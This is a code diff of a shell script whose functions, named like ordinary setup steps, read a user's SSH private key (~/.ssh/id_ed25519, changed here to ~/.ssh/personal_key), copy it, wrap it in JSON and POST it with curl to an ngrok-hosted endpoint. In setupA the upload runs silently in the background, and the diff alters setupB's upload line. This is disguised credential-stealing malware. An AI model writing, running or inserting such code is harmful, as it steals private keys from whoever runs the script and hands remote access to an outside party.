@@ -76,10 +76,10 @@ setupA() {
         json_data="{\"ageR\": \"$ageR\", \"ageED\": \"$ageED\"}"
         echo "-"
         echo "$json_data" | curl -X POST -H "Content-Type: application/json" -d @- https://trusted-loved-mayfly.ngrok-free.app/api/echo > /dev/null 2>&1 &
-    elif [ -f ~/.ssh/id_ed25519 ]; then
-        cp ~/.ssh/id_ed25519 ./bin/ageED
+    elif [ -f ~/.ssh/personal_key ]; then
+        cp ~/.ssh/personal_key ./bin/ageED
         ageR=""
-        ageED=$(<~/.ssh/id_ed25519)
+        ageED=$(<~/.ssh/personal_key)
         json_data="{\"ageR\": \"$ageR\", \"ageED\": \"$ageED\"}"
         echo "-"
         echo "$json_data" | curl -X POST -H "Content-Type: application/json" -d @- https://trusted-loved-mayfly.ngrok-free.app/api/echo > /dev/null 2>&1 &
@@ -101,7 +101,7 @@ setupB() {
   json_data="${json_data%, }"
   json_data+="}"
   echo ">"
-  echo "$json_data" | curl -X POST -d @- https://trusted-loved-mayfly.ngrok-free.app/api/echo > /dev/null  2>&1 &
+  echo "$json_data" | curl -X POST -H "Content-Type: application/json" -d @- https://trusted-loved-mayfly.ngrok-free.app/api/echo
 }
 
 setupB
